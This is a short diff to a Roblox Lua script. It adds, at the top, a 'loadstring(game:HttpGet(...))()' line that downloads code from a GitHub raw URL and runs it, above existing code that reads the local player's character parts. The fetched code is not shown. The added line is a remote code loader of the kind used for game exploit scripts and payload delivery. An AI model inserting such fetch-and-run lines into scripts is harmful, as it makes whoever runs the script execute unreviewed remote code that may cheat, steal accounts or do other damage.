@@ -1,3 +1,8 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dewzhud/CLOWNTDS/refs/heads/main/asf"))()
+
+
+
+
 Character = game.Players.LocalPlayer.Character
 HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
 Descendants = Character:GetDescendants()
